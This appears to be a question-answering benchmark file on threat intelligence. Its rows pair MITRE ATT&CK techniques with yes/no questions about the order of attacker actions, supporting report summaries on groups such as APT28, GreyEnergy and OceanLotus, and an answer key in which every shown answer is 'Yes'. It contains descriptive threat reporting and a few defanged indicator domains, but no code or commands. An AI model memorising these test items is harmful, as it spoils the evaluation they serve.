857,210,210-Defense Evasion-T1205-Traffic Signaling,"After TG-3279 installs tools by compromising the account credentials of users with administrator privileges, is it likely that the group will communicate with the PATX framework over port 443 as part of their defense evasion tactics?",Defense Evasion: TG-3279's command and control (C2) communication often takes place over port 443 but is not HTTPS traffic. The traffic appears to be part of a larger framework named PATX. The C2 communications include IP calculations and domain name parking to complicate investigations.,"Reconnaissance: Threat Group-3279 (TG-3279) performs reconnaissance on targets via open source research and network scanning.
Resource Development: TG-3279 reuses network infrastructure between attacks, sharing IP addresses by multiple domain names. Domain registration information tends to be unique, sometimes using famous names or appearing as jokes, often cloned from legitimate companies like Google or Microsoft.
Initial Access: TG-3279 uses a port scanning tool named 's' and an RDP brute force tool named 'rdp_crk', which may be used to scan and exploit targets.
Persistence: TG-3279 leverages optionally loaded DLLs to establish persistence for the Conpee plugin framework, using a method that does not require modifying the Windows Registry or startup items.
Privilege Escalation: TG-3279 installs tools by compromising the account credentials of users with administrator privileges.
Credential Access: TG-3279 actors strive to access network and system administrators' accounts to gain the most access to the target organization.
Lateral Movement: After initial exploitation, TG-3279 relies on a few key hosts to act as beachheads running the Conpee or Etso tools. TG-3279 then adds scheduled system tasks to other key resources within an organization to use compromised credentials gathered from pwdump6.
Command and Control: TG-3279 C2 communication often takes place over port 443 but is not HTTPS traffic. It includes IP calculations and domain name parking to complicate investigations.
Others: TG-3279 has been active since 2009 and is associated with the China Cracking Group. The personas Laurentiu Moon and Sincoder are believed to be TG-3279 actors. The group's focus is on collecting video game source code to crack games for free use, develop tools to cheat at the games, or use the source code for competing products. TG-3279 has been observed using tools such as Conpee, a modular plugin-based RAT framework, and other tools authored by Sincoder. TG-3279 has also been observed using popular public tools like pwdump6. The group has been observed compromising video game companies and is likely to continue operations for the foreseeable future. There are similarities between TG-3279 and TG-2633, also known as Winnti, but no strong link has been established between the groups.",Yes,group-3279-targets-the-video-game-industry
859,210,210-Lateral Movement-T1550-Use Alternate Authentication Material,"After TG-3279 gains access to network and system administrator accounts for credential access, is it likely that they will use compromised credentials gathered from pwdump6 for lateral movement through alternate authentication methods before employing the Conpee or Etso tools on key hosts as beachheads within the target network?","Lateral Movement: After initial exploitation, TG-3279 relies on a few key hosts to act as beachheads running the Conpee or Etso tools. TG-3279 then adds scheduled system tasks to other key resources within an organization to use compromised credentials gathered from pwdump6.","Reconnaissance: Threat Group-3279 (TG-3279) performs reconnaissance on targets via open source research and network scanning.
Resource Development: TG-3279 reuses network infrastructure between attacks, sharing IP addresses by multiple domain names. Domain registration information tends to be unique, sometimes using famous names or appearing as jokes, often cloned from legitimate companies like Google or Microsoft.
Initial Access: TG-3279 uses a port scanning tool named 's' and an RDP brute force tool named 'rdp_crk', which may be used to scan and exploit targets.
Persistence: TG-3279 leverages optionally loaded DLLs to establish persistence for the Conpee plugin framework, using a method that does not require modifying the Windows Registry or startup items.
Privilege Escalation: TG-3279 installs tools by compromising the account credentials of users with administrator privileges.
Defense Evasion: TG-3279's command and control (C2) communication often takes place over port 443 but is not HTTPS traffic. The traffic appears to be part of a larger framework named PATX. The C2 communications include IP calculations and domain name parking to complicate investigations.
Credential Access: TG-3279 actors strive to access network and system administrators' accounts to gain the most access to the target organization.
Command and Control: TG-3279 C2 communication often takes place over port 443 but is not HTTPS traffic. It includes IP calculations and domain name parking to complicate investigations.
Others: TG-3279 has been active since 2009 and is associated with the China Cracking Group. The personas Laurentiu Moon and Sincoder are believed to be TG-3279 actors. The group's focus is on collecting video game source code to crack games for free use, develop tools to cheat at the games, or use the source code for competing products. TG-3279 has been observed using tools such as Conpee, a modular plugin-based RAT framework, and other tools authored by Sincoder. TG-3279 has also been observed using popular public tools like pwdump6. The group has been observed compromising video game companies and is likely to continue operations for the foreseeable future. There are similarities between TG-3279 and TG-2633, also known as Winnti, but no strong link has been established between the groups.",Yes,group-3279-targets-the-video-game-industry
863,211,211-Reconnaissance-T1592-Gather Victim Host Information,"After using a modular malware framework during resource development with functionality defined by uploaded modules to targeted systems, is it likely that GreyEnergy will proceed to secure access to ICS control workstations and servers for host information gathering as part of their reconnaissance efforts?","Reconnaissance: ESET research has uncovered GreyEnergy, a successor to the BlackEnergy APT group, which has been targeting energy companies and other high-value targets in Ukraine and Poland for espionage and reconnaissance. GreyEnergy's activities include backdoor access, file extraction, taking screenshots, keylogging, password and credential stealing, and have been strategically targeting ICS control workstations running SCADA software and servers.","Resource Development: GreyEnergy's malware framework is modular, with functionality dependent on the combination of modules uploaded to targeted victim systems. The modules observed were used for espionage and reconnaissance purposes. GreyEnergy operators have been using a 'mini' backdoor deployed before admin rights are obtained and the full version is deployed. All remote C&C servers used by GreyEnergy were active Tor relays, an operational security technique to covertly connect to these servers.
Initial Access: GreyEnergy has used two distinct infection vectors: spearphishing and the compromise of public-facing web servers. When a vulnerable web server was hosted internally and connected to the rest of a targeted organization's network, the attacker would attempt to move laterally to other workstations. This technique is used not only as a primary infection vector but also as a backup reinfection vector.
Persistence: To cover their tracks, GreyEnergy's operators securely wipe the malware components from the victims' hard drives.
Defense Evasion: GreyEnergy employs stealth techniques, including pushing only selected modules to selected targets when needed, partial encryption of modules using AES-256, and running some modules fileless in memory to hinder analysis and detection.
Credential Access: GreyEnergy operators use common external tools such as Mimikatz, PsExec, WinExe, Nmap, and a custom port scanner for credential access.
Lateral Movement: GreyEnergy attackers deploy internal C&C proxies within the victims' networks to redirect requests from infected nodes to an external C&C server on the internet. This stealth tactic makes it less suspicious as multiple computers are seen communicating with an internal server rather than a remote one.
Command and Control: GreyEnergy's internal C&C proxies redirect requests from infected nodes inside the network to an external C&C server on the internet, facilitating stealthy communication.
Others: GreyEnergy is linked to the BlackEnergy and TeleBots subgroups due to the appearance of GreyEnergy coinciding with the disappearance of BlackEnergy, shared interest in the energy sector and critical infrastructure, victims primarily in Ukraine and Poland, architectural similarities between the malware frameworks, and operational security techniques. GreyEnergy is considered a more modern toolkit with a greater focus on stealth compared to BlackEnergy. Some GreyEnergy samples were signed with a certificate from Advantech, indicating that these were most likely stolen, similar to Stuxnet and a recent Plead malware campaign. GreyEnergy also deployed an early version of the TeleBots' NotPetya worm, showing significant code reuse between this ransomware component and the GreyEnergy core module.",Yes,blog_GreyEnergy_Updated
864,211,211-Resource Development-T1587-Develop Capabilities,"After achieving reconnaissance by strategically targeting ICS control workstations and effectively extracting data, taking screenshots, and performing keylogging, is it likely that GreyEnergy operators will develop capabilities by creating and deploying a modular malware framework with functionality tailored for espionage and reconnaissance?","Resource Development: GreyEnergy's malware framework is modular, with functionality dependent on the combination of modules uploaded to targeted victim systems. The modules observed were used for espionage and reconnaissance purposes. GreyEnergy operators have been using a 'mini' backdoor deployed before admin rights are obtained and the full version is deployed. All remote C&C servers used by GreyEnergy were active Tor relays, an operational security technique to covertly connect to these servers.","Reconnaissance: ESET research has uncovered GreyEnergy, a successor to the BlackEnergy APT group, which has been targeting energy companies and other high-value targets in Ukraine and Poland for espionage and reconnaissance. GreyEnergy's activities include backdoor access, file extraction, taking screenshots, keylogging, password and credential stealing, and have been strategically targeting ICS control workstations running SCADA software and servers.
Initial Access: GreyEnergy has used two distinct infection vectors: spearphishing and the compromise of public-facing web servers. When a vulnerable web server was hosted internally and connected to the rest of a targeted organization's network, the attacker would attempt to move laterally to other workstations. This technique is used not only as a primary infection vector but also as a backup reinfection vector.
Persistence: To cover their tracks, GreyEnergy's operators securely wipe the malware components from the victims' hard drives.
Defense Evasion: GreyEnergy employs stealth techniques, including pushing only selected modules to selected targets when needed, partial encryption of modules using AES-256, and running some modules fileless in memory to hinder analysis and detection.
Credential Access: GreyEnergy operators use common external tools such as Mimikatz, PsExec, WinExe, Nmap, and a custom port scanner for credential access.
Lateral Movement: GreyEnergy attackers deploy internal C&C proxies within the victims' networks to redirect requests from infected nodes to an external C&C server on the internet. This stealth tactic makes it less suspicious as multiple computers are seen communicating with an internal server rather than a remote one.
Command and Control: GreyEnergy's internal C&C proxies redirect requests from infected nodes inside the network to an external C&C server on the internet, facilitating stealthy communication.
Others: GreyEnergy is linked to the BlackEnergy and TeleBots subgroups due to the appearance of GreyEnergy coinciding with the disappearance of BlackEnergy, shared interest in the energy sector and critical infrastructure, victims primarily in Ukraine and Poland, architectural similarities between the malware frameworks, and operational security techniques. GreyEnergy is considered a more modern toolkit with a greater focus on stealth compared to BlackEnergy. Some GreyEnergy samples were signed with a certificate from Advantech, indicating that these were most likely stolen, similar to Stuxnet and a recent Plead malware campaign. GreyEnergy also deployed an early version of the TeleBots' NotPetya worm, showing significant code reuse between this ransomware component and the GreyEnergy core module.",Yes,blog_GreyEnergy_Updated
869,211,211-Defense Evasion-T1027-Obfuscated Files or Information,"Before GreyEnergy employs stealth techniques like partial AES-256 encryption of modules for defense evasion, is it likely that they will first gain initial access through vectors such as spearphishing or compromised public-facing web servers to begin targeting internally connected systems?","Defense Evasion: GreyEnergy employs stealth techniques, including pushing only selected modules to selected targets when needed, partial encryption of modules using AES-256, and running some modules fileless in memory to hinder analysis and detection.","Reconnaissance: ESET research has uncovered GreyEnergy, a successor to the BlackEnergy APT group, which has been targeting energy companies and other high-value targets in Ukraine and Poland for espionage and reconnaissance. GreyEnergy's activities include backdoor access, file extraction, taking screenshots, keylogging, password and credential stealing, and have been strategically targeting ICS control workstations running SCADA software and servers.
Resource Development: GreyEnergy's malware framework is modular, with functionality dependent on the combination of modules uploaded to targeted victim systems. The modules observed were used for espionage and reconnaissance purposes. GreyEnergy operators have been using a 'mini' backdoor deployed before admin rights are obtained and the full version is deployed. All remote C&C servers used by GreyEnergy were active Tor relays, an operational security technique to covertly connect to these servers.
Initial Access: GreyEnergy has used two distinct infection vectors: spearphishing and the compromise of public-facing web servers. When a vulnerable web server was hosted internally and connected to the rest of a targeted organization's network, the attacker would attempt to move laterally to other workstations. This technique is used not only as a primary infection vector but also as a backup reinfection vector.
Persistence: To cover their tracks, GreyEnergy's operators securely wipe the malware components from the victims' hard drives.
Credential Access: GreyEnergy operators use common external tools such as Mimikatz, PsExec, WinExe, Nmap, and a custom port scanner for credential access.
Lateral Movement: GreyEnergy attackers deploy internal C&C proxies within the victims' networks to redirect requests from infected nodes to an external C&C server on the internet. This stealth tactic makes it less suspicious as multiple computers are seen communicating with an internal server rather than a remote one.
Command and Control: GreyEnergy's internal C&C proxies redirect requests from infected nodes inside the network to an external C&C server on the internet, facilitating stealthy communication.
Others: GreyEnergy is linked to the BlackEnergy and TeleBots subgroups due to the appearance of GreyEnergy coinciding with the disappearance of BlackEnergy, shared interest in the energy sector and critical infrastructure, victims primarily in Ukraine and Poland, architectural similarities between the malware frameworks, and operational security techniques. GreyEnergy is considered a more modern toolkit with a greater focus on stealth compared to BlackEnergy. Some GreyEnergy samples were signed with a certificate from Advantech, indicating that these were most likely stolen, similar to Stuxnet and a recent Plead malware campaign. GreyEnergy also deployed an early version of the TeleBots' NotPetya worm, showing significant code reuse between this ransomware component and the GreyEnergy core module.",Yes,blog_GreyEnergy_Updated
870,211,211-Defense Evasion-T1564-Hide Artifacts,"After using spearphishing emails and compromising public-facing web servers to gain initial access, is GreyEnergy likely to implement stealth techniques including pushing only selected modules to selected targets and partially encrypting these modules using AES-256 before running some modules fileless in memory to hinder analysis and detection?","Defense Evasion: GreyEnergy employs stealth techniques, including pushing only selected modules to selected targets when needed, partial encryption of modules using AES-256, and running some modules fileless in memory to hinder analysis and detection.","Reconnaissance: ESET research has uncovered GreyEnergy, a successor to the BlackEnergy APT group, which has been targeting energy companies and other high-value targets in Ukraine and Poland for espionage and reconnaissance. GreyEnergy's activities include backdoor access, file extraction, taking screenshots, keylogging, password and credential stealing, and have been strategically targeting ICS control workstations running SCADA software and servers.
Resource Development: GreyEnergy's malware framework is modular, with functionality dependent on the combination of modules uploaded to targeted victim systems. The modules observed were used for espionage and reconnaissance purposes. GreyEnergy operators have been using a 'mini' backdoor deployed before admin rights are obtained and the full version is deployed. All remote C&C servers used by GreyEnergy were active Tor relays, an operational security technique to covertly connect to these servers.
Initial Access: GreyEnergy has used two distinct infection vectors: spearphishing and the compromise of public-facing web servers. When a vulnerable web server was hosted internally and connected to the rest of a targeted organization's network, the attacker would attempt to move laterally to other workstations. This technique is used not only as a primary infection vector but also as a backup reinfection vector.
Persistence: To cover their tracks, GreyEnergy's operators securely wipe the malware components from the victims' hard drives.
Credential Access: GreyEnergy operators use common external tools such as Mimikatz, PsExec, WinExe, Nmap, and a custom port scanner for credential access.
Lateral Movement: GreyEnergy attackers deploy internal C&C proxies within the victims' networks to redirect requests from infected nodes to an external C&C server on the internet. This stealth tactic makes it less suspicious as multiple computers are seen communicating with an internal server rather than a remote one.
Command and Control: GreyEnergy's internal C&C proxies redirect requests from infected nodes inside the network to an external C&C server on the internet, facilitating stealthy communication.
Others: GreyEnergy is linked to the BlackEnergy and TeleBots subgroups due to the appearance of GreyEnergy coinciding with the disappearance of BlackEnergy, shared interest in the energy sector and critical infrastructure, victims primarily in Ukraine and Poland, architectural similarities between the malware frameworks, and operational security techniques. GreyEnergy is considered a more modern toolkit with a greater focus on stealth compared to BlackEnergy. Some GreyEnergy samples were signed with a certificate from Advantech, indicating that these were most likely stolen, similar to Stuxnet and a recent Plead malware campaign. GreyEnergy also deployed an early version of the TeleBots' NotPetya worm, showing significant code reuse between this ransomware component and the GreyEnergy core module.",Yes,blog_GreyEnergy_Updated
875,212,212-Defense Evasion-T1574-Hijack Execution Flow,"After delivering Gh0st RAT via email to gain initial access, is it likely that the Musical Chairs actors will employ DLL side-loading to evade defenses before reusing long-standing C2 domains for communication?","Defense Evasion: The actors have demonstrated the use of DLL side-loading as part of their evasion tactics. Additionally, they have embedded a fully-functional version of the game Tetris within their malware, which launches under a special condition when attached to a debugger.","Initial Access: The actors behind the Musical Chairs campaign have been observed delivering a new sample of Gh0st RAT via email, consistent with their documented tactics. Artifacts provided by malware-traffic-analysis.net indicate the use of email as a delivery mechanism.
Execution: The actors have transitioned from using BAT and JS files in the infection process to employing DLL side-loading techniques. A signed executable is used to load a malicious DLL, which then launches the actual Gh0st DLL.
Command and Control: ASERT has discovered new command-and-control infrastructure associated with the Musical Chairs campaign. The actors are known for the longevity of their C2 domains, reusing them even after identification. A new domain, etybh[.]com, has been registered and is expected to be used in new intrusions. The domain shares the same IP and registrar with previously known C2 domains yourbroiler[.]com and meitanjiaoyiwang[.]com.
Others: ASERT has amended a previous blog post to remove an incorrect association with the APT group responsible for the Night Dragon campaign. The correction was made following input from the research team at Palo Alto Networks.",Yes,Musical Chairs Playing Tetris
876,212,212-Defense Evasion-T1622-Debugger Evasion,"After employing a signed executable to load a malicious DLL and launching actual Gh0st DLL in their execution phase, is it likely that the actors behind the Musical Chairs campaign will use debugger evasion by embedding the Tetris game to evade defense mechanisms before establishing new command-and-control infrastructure using domains like etybh[.]com?","Defense Evasion: The actors have demonstrated the use of DLL side-loading as part of their evasion tactics. Additionally, they have embedded a fully-functional version of the game Tetris within their malware, which launches under a special condition when attached to a debugger.","Initial Access: The actors behind the Musical Chairs campaign have been observed delivering a new sample of Gh0st RAT via email, consistent with their documented tactics. Artifacts provided by malware-traffic-analysis.net indicate the use of email as a delivery mechanism.
Execution: The actors have transitioned from using BAT and JS files in the infection process to employing DLL side-loading techniques. A signed executable is used to load a malicious DLL, which then launches the actual Gh0st DLL.
Command and Control: ASERT has discovered new command-and-control infrastructure associated with the Musical Chairs campaign. The actors are known for the longevity of their C2 domains, reusing them even after identification. A new domain, etybh[.]com, has been registered and is expected to be used in new intrusions. The domain shares the same IP and registrar with previously known C2 domains yourbroiler[.]com and meitanjiaoyiwang[.]com.
Others: ASERT has amended a previous blog post to remove an incorrect association with the APT group responsible for the Night Dragon campaign. The correction was made following input from the research team at Palo Alto Networks.",Yes,Musical Chairs Playing Tetris
883,213,213-Lateral Movement-T1210-Exploitation of Remote Services,"After using their multi-functional framework to evade defenses via alternative communication channels and explore the local area network using admin credentials for scanning, is it likely that the Rocra attackers will utilize a module to find hosts vulnerable to MS08-067 or infect remote hosts during lateral movement?","Lateral Movement: During lateral movement in a victim's network, the Rocra attackers deployed a module to actively scan the local area network, find hosts vulnerable to MS08-067, or accessible with admin credentials from their password database. Another module used collected information to infect remote hosts in the same network.","Initial Access: The 'Red October' campaign, identified as 'Rocra', has been active for at least five years, targeting diplomatic and governmental agencies worldwide. The attackers used spear phishing with documents containing exploits for known vulnerabilities such as CVE-2009-3129, CVE-2010-3333, and CVE-2012-0158 to gain initial access. The earliest attacks with the MS Excel exploit occurred in 2010 and 2011, while the MS Word exploits were used in the summer of 2012. The spear phishing documents were customized for the victims, with the executable replaced by the attackers' own code.
Defense Evasion: The Rocra attackers created a multi-functional framework capable of quick feature extension for intelligence gathering. The system is resistant to C&C server takeover and allows recovery access to infected machines using alternative communication channels. The attackers deployed a module during lateral movement to actively scan the local area network, find hosts vulnerable to MS08-067, or accessible with admin credentials from their password database.
Command and Control: The Rocra campaign's C&C infrastructure is a chain of servers working as proxies to hide the true command and control server. The attackers created more than 60 domain names and several server hosting locations in different countries, mainly Germany and Russia, to control the network of infected machines. The C&C infrastructure's complexity rivals that of the Flame malware.
Others: The Rocra campaign has been active for at least five years, infiltrating networks at diplomatic, governmental, and scientific research organizations. The attackers have Russian-speaking origins and have created a sophisticated multi-functional framework for intelligence gathering. The malware targets not only workstations but also mobile devices and network equipment. The attackers have used at least three different exploits for previously known vulnerabilities and have a high degree of interaction with the victims' networks. Kaspersky Lab has identified several hundred infections worldwide, with the majority in Eastern Europe, North America, and Western European countries. The campaign has infected hundreds of victims in eight main categories, including government, diplomatic, research institutions, and military. The attackers' malware modules have been created by Russian-speaking operatives and have not been used in any other operations. Kaspersky Lab, in collaboration with international organizations, is continuing its investigation and providing resources for remediation and mitigation.",Yes,Securelist_RedOctober
886,214,214-Execution-T1203-Exploitation for Client Execution,"After APT28 engages in spear-phishing campaigns to gain initial access to target networks by delivering exploit documents, is it likely that the group will execute those documents to exploit vulnerabilities and install malware, such as GAMEFISH, on victim systems before leveraging tools like CHOPSTICK, EVILTOSS, and SOURFACE during their operations?","Execution: APT28 has been observed executing malware on victim systems through spear-phishing emails that deliver exploit documents. These documents exploit vulnerabilities to install malware such as GAMEFISH onto the targeted machines. APT28's malware suite includes tools like CHOPSTICK, EVILTOSS, GAMEFISH, SOURFACE, OLDBAIT, and CORESHELL, each serving roles such as backdoors, downloaders, and credential harvesters.","Initial Access: APT28 has engaged in spear-phishing campaigns to gain initial access to target networks. They have used spear-phishing emails containing malicious URLs designed to harvest email credentials or deliver exploit documents that deploy malware onto users' systems. For instance, APT28 registered domains spoofing legitimate organizations and webmail services to deceive victims into providing their credentials or accessing malicious documents. They exploited vulnerabilities such as Flash Vulnerability CVE-2016-7855 and Windows Vulnerability CVE-2016-7255 to install malware on victims who visited a malicious URL.
Defense Evasion: APT28 has demonstrated the ability to evade defenses by leveraging zero-day vulnerabilities, using public code depositories for development, and obtaining credentials through fabricated authorization requests. They have also shown a preference for using legitimate tools already present within victims' systems for lateral movement, sometimes foregoing their traditional toolset.
Credential Access: APT28 has used spear-phishing to harvest credentials, often by directing victims to fake login pages or by asking them to authorize malicious applications that bypass security measures like two-factor authentication. They have also employed credential harvesters like OLDBAIT within their malware suite.
Lateral Movement: APT28 has used strategic web compromises (SWC) to infect users with malware by redirecting them from compromised legitimate sites. They have also exploited known vulnerabilities on internet-facing servers to gain access and move deeper into victim networks.
Others: APT28, attributed to the Russian Government, has been active since at least 2007, targeting political entities, governments, militaries, and other organizations. They have been involved in information operations, including data leaks and false flag operations, to influence foreign politics. Notable incidents include the compromise of the World Anti-Doping Agency (WADA) and the Democratic National Committee (DNC), where stolen data was strategically leaked. APT28's operations align with Russian strategic interests and military doctrine, and they are expected to continue similar efforts in future political events.",Yes,APT28-Center-of-Storm-2017
887,214,214-Defense Evasion-T1211-Exploitation for Defense Evasion,"After the use of malware exploiting vulnerabilities from spear-phishing emails for execution on victim systems, is it likely that APT28 will leverage zero-day vulnerabilities to evade defenses before harvesting credentials through fabricated authorization requests or malicious login pages?","Defense Evasion: APT28 has demonstrated the ability to evade defenses by leveraging zero-day vulnerabilities, using public code depositories for development, and obtaining credentials through fabricated authorization requests. They have also shown a preference for using legitimate tools already present within victims' systems for lateral movement, sometimes foregoing their traditional toolset.","Initial Access: APT28 has engaged in spear-phishing campaigns to gain initial access to target networks. They have used spear-phishing emails containing malicious URLs designed to harvest email credentials or deliver exploit documents that deploy malware onto users' systems. For instance, APT28 registered domains spoofing legitimate organizations and webmail services to deceive victims into providing their credentials or accessing malicious documents. They exploited vulnerabilities such as Flash Vulnerability CVE-2016-7855 and Windows Vulnerability CVE-2016-7255 to install malware on victims who visited a malicious URL.
Execution: APT28 has been observed executing malware on victim systems through spear-phishing emails that deliver exploit documents. These documents exploit vulnerabilities to install malware such as GAMEFISH onto the targeted machines. APT28's malware suite includes tools like CHOPSTICK, EVILTOSS, GAMEFISH, SOURFACE, OLDBAIT, and CORESHELL, each serving roles such as backdoors, downloaders, and credential harvesters.
Credential Access: APT28 has used spear-phishing to harvest credentials, often by directing victims to fake login pages or by asking them to authorize malicious applications that bypass security measures like two-factor authentication. They have also employed credential harvesters like OLDBAIT within their malware suite.
Lateral Movement: APT28 has used strategic web compromises (SWC) to infect users with malware by redirecting them from compromised legitimate sites. They have also exploited known vulnerabilities on internet-facing servers to gain access and move deeper into victim networks.
Others: APT28, attributed to the Russian Government, has been active since at least 2007, targeting political entities, governments, militaries, and other organizations. They have been involved in information operations, including data leaks and false flag operations, to influence foreign politics. Notable incidents include the compromise of the World Anti-Doping Agency (WADA) and the Democratic National Committee (DNC), where stolen data was strategically leaked. APT28's operations align with Russian strategic interests and military doctrine, and they are expected to continue similar efforts in future political events.",Yes,APT28-Center-of-Storm-2017
890,214,214-Defense Evasion-T1202-Indirect Command Execution,"After executing malware such as GAMEFISH through spear-phishing exploit documents, is it likely that APT28 will leverage legitimate tools already present within victims' systems for lateral movement, bypassing their traditional toolset for evading defenses?","Defense Evasion: APT28 has demonstrated the ability to evade defenses by leveraging zero-day vulnerabilities, using public code depositories for development, and obtaining credentials through fabricated authorization requests. They have also shown a preference for using legitimate tools already present within victims' systems for lateral movement, sometimes foregoing their traditional toolset.","Initial Access: APT28 has engaged in spear-phishing campaigns to gain initial access to target networks. They have used spear-phishing emails containing malicious URLs designed to harvest email credentials or deliver exploit documents that deploy malware onto users' systems. For instance, APT28 registered domains spoofing legitimate organizations and webmail services to deceive victims into providing their credentials or accessing malicious documents. They exploited vulnerabilities such as Flash Vulnerability CVE-2016-7855 and Windows Vulnerability CVE-2016-7255 to install malware on victims who visited a malicious URL.
Execution: APT28 has been observed executing malware on victim systems through spear-phishing emails that deliver exploit documents. These documents exploit vulnerabilities to install malware such as GAMEFISH onto the targeted machines. APT28's malware suite includes tools like CHOPSTICK, EVILTOSS, GAMEFISH, SOURFACE, OLDBAIT, and CORESHELL, each serving roles such as backdoors, downloaders, and credential harvesters.
Credential Access: APT28 has used spear-phishing to harvest credentials, often by directing victims to fake login pages or by asking them to authorize malicious applications that bypass security measures like two-factor authentication. They have also employed credential harvesters like OLDBAIT within their malware suite.
Lateral Movement: APT28 has used strategic web compromises (SWC) to infect users with malware by redirecting them from compromised legitimate sites. They have also exploited known vulnerabilities on internet-facing servers to gain access and move deeper into victim networks.
Others: APT28, attributed to the Russian Government, has been active since at least 2007, targeting political entities, governments, militaries, and other organizations. They have been involved in information operations, including data leaks and false flag operations, to influence foreign politics. Notable incidents include the compromise of the World Anti-Doping Agency (WADA) and the Democratic National Committee (DNC), where stolen data was strategically leaked. APT28's operations align with Russian strategic interests and military doctrine, and they are expected to continue similar efforts in future political events.",Yes,APT28-Center-of-Storm-2017
893,215,215-Defense Evasion-T1027-Obfuscated Files or Information,"After Palo Alto Networks managed to take control of most C&C domains and published a report on Infy, is it likely that the attackers moved their C&C domains to new IP addresses and released a new version of the malware before the new version began checking for the presence of antivirus products such as those from Kaspersky, Trend Micro, and Avast?","Defense Evasion: Following the disclosure, the attackers moved their C&C domains to new IP addresses and released a new version of the malware, which no longer records videos but continues to steal files. The new version also checks for the presence of antivirus products from Kaspersky, Trend Micro, and Avast. Despite the encoding technique and key used by the attackers remaining unchanged, experts believe the threat group was unaware of the security firm's report.","Command and Control: The security firm Palo Alto Networks initially managed to take control of all but one of the C&C domains used by the attackers, preventing the group from stealing information from most victims. After publishing its report on Infy, Palo Alto Networks worked with entities hosting the threat actor's C&C infrastructure to take control of their domains. However, the attackers attempted to revive the campaign using the remaining C&C domains they controlled. Eventually, all domains were sinkholed, completely shutting down the campaign.
Others: Researchers at Palo Alto Networks disrupted an Iran-linked cyberespionage campaign targeting global governments and businesses. The malware, 'Infy,' had been used in espionage since at least 2007 and remained undetected due to highly targeted attacks. Over 450 malware agents were found on 326 systems across 35 countries, with many victims being Iranian citizens. More than 40 variants of Infy exist, with two major versions: the original Infy and the more sophisticated Infy M, the latter mainly targeting high-value individuals. Despite the disruption, researchers anticipate the threat actor's return.",Yes,ref_researchers-disrupt-iranian-cyberespionage-campaign
895,216,216-Defense Evasion-T1564-Hide Artifacts,"After a shellcode initiates a process to load a DLL (LdrLoadDll) and executes a decrypted payload using the aes128 encryption algorithm during the execution phase, is it likely that the malware will hook its main function (DllMain) to evade detection by obfuscating its presence in the defense evasion phase?","Defense Evasion: The report details an evasion technique where the malware's main function (DllMain) is hooked to evade detection. Additionally, the shellcode is encrypted using the aes128 algorithm and a sha256 hashing function to obfuscate its presence.","Execution: The CTI report indicates the use of a multi-stage attack involving a shellcode that initiates a process to load a DLL (LdrLoadDll). The shellcode is designed to execute a payload encrypted with a randomly generated key (Key2Encrypt DataPayload). The payload, once decrypted, leverages the aes128 encryption algorithm and a pre-configured password. The attack also involves the use of a checksum verification method (sha256 checksum) to ensure the integrity of the payload before execution.",Yes,apt_report_2019.CN_Version
900,217,217-Defense Evasion-T1055-Process Injection,"After decoding and executing the appropriate base64 encoded blob depending on the system architecture during the execution phase, is it likely that the KerrDown DLL will execute the payload in memory using process injection as part of its defense evasion tactic?","Defense Evasion: The actors reused a VBS decode function published by Motobit to decode base64 blobs. The KerrDown DLL is dropped in the directory 'Users\Administrator\AppData\Roaming\' as 'main_background.png'. The DLL retrieves the payload from a URL, decrypts it using the DES algorithm, and executes it in memory, ensuring that only the KerrDown DLL downloader is saved on the system and the payload is executed directly in memory without being written to the system.","Initial Access: The OceanLotus group (APT32) has been using a new custom downloader malware named 'KerrDown' since early 2018. Two methods were identified for delivering KerrDown to targets: Microsoft Office Documents with malicious macros and RAR archives containing legitimate programs with DLL side-loading. The RAR file names used to trick targets are in Vietnamese, indicating that the primary targets are either in Vietnam or Vietnamese speaking individuals.
Execution: The malicious Office document contains an image file with a message in Vietnamese, asking the victim to enable macros to view the contents. The document has two different base64 blobs inserted in separate tables, with the font size changed to 1 to potentially evade detection. Depending on the victim's system architecture (32-bit or 64-bit), the appropriate base64 encoded blob is decoded and executed.
Command and Control: The final payload of KerrDown, which was active during the time of analysis, turned out to be a variant of Cobalt Strike Beacon. This commercial penetration testing tool has been used by various threat actors in their campaigns. The KerrDown downloader attempts to download the payload from a URL depending on the OS architecture of the victim machine.
Others: Analysis of compile timestamps of KerrDown samples suggests that OceanLotus has been using the downloader since at least March 2018 and continues to actively use it. A pattern in the group's working hours was discerned, indicating a typical 9 AM to 6 PM working pattern in GMT+7, with most samples compiled during this period and on weekdays, suggesting formal working hours and operations likely out of Vietnam or nearby countries. The group's broader geographic and industry-wide target base may indicate the use of similar tools and playbooks against other targets. Palo Alto Networks customers are protected via Indicators of Compromise provided in the report.",Yes,OceanLotus_KerrDown
903,218,218-Persistence-T1053-Scheduled Task/Job,"After loading encrypted executables into legitimate system processes through process hollowing during its execution stage, is it likely that Dexphot will ensure persistence by using schtasks.exe to create scheduled tasks for updates and re-infection?","Persistence: Dexphot ensured persistence through dual monitoring services that checked the status of all three malicious processes and re-infected the device if any were terminated. It also used schtasks.exe to create scheduled tasks for updates and re-infection, employing techniques like Scheduled Task and Signed Binary Proxy Execution. The tasks called msiexec.exe as a proxy to run the malicious code and updated Dexphot's components upon system reboot and every 90 or 110 minutes while the system was running.","Execution: The Dexphot attack, first detected in October 2018, involved a complex execution stage where it wrote five key files to disk: an installer with two URLs, an MSI package file, a password-protected ZIP archive, a loader DLL, and an encrypted data file containing three additional executables. These executables were loaded into system processes via process hollowing, targeting legitimate system processes such as msiexec.exe, unzip.exe, rundll32.exe, schtasks.exe, and powershell.exe, and later svchost.exe, tracert.exe, and setup.exe.
Defense Evasion: Dexphot employed multiple layers of security evasion, including the use of SoftwareBundler:Win32/ICLoader to drop and run the installer, living-off-the-land techniques, and obfuscated batch scripts to check for antivirus products. It also used fileless techniques and process hollowing to hide malicious code within legitimate system processes, making detection and remediation difficult.
Others: Microsoft Defender ATP Research Team, led by Hazel Kim, closely monitored the Dexphot threat for over a year, observing its evolution and the attackers' efforts to upgrade the malware, target new processes, and work around defensive measures. Microsoft Defender ATP's behavioral blocking and containment capabilities were crucial in stopping the Dexphot campaign. The team's insights into the goals and motivations of Dexphot's authors contributed to a broader understanding of cybercriminal behavior.",Yes,Insights from one year of tracking a polymorphic threat
